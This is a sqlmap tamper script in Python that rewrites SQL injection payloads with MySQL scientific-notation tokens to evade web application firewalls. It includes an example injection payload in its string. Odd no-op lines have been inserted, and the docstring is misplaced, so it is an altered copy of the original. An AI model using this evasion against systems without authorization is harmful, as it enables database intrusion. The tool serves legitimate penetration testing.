"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import re
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.HIGHEST

def dependencies():
    if False:
        return 10
    pass

def tamper(payload, **kwargs):
    if False:
        print('Hello World!')
    "\n    Abuses MySQL scientific notation\n\n    Requirement:\n        * MySQL\n\n    Notes:\n        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/\n\n    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')\n    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'\n    "
    if payload:
        payload = re.sub('[),.*^/|&]', ' 1.e\\g<0>', payload)
        payload = re.sub('(\\w+)\\(', lambda match: '%s 1.e(' % match.group(1) if not re.search('(?i)\\A(MID|CAST|FROM|COUNT)\\Z', match.group(1)) else match.group(0), payload)
    return payload